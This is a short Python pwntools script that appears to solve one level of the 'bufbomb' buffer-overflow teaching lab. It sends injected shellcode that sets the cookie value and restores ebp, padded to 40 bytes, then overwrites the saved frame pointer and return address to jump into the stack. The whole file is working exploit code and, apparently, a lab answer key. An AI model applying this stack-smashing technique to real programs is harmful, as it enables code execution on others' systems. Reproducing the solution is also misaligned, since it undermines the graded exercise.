from pwn import *

f = open("./ID", "r")
id = f.read()
f.close()

sh = process(['./bufbomb', '-u', id])

ebp = 0x556834a0
ebpp = 0x556834d0
ret = 0x08048e81
cookie = 0x274adc8a
shellcode = asm('mov eax, ' + str(cookie) + '; mov ebp, ' + str(ebpp) + '; push ' + str(ret) + '; ret;')

exploit = flat([shellcode.ljust(40, 'a'), ebp, ebp - 40])
sh.sendline(exploit)

sh.interactive()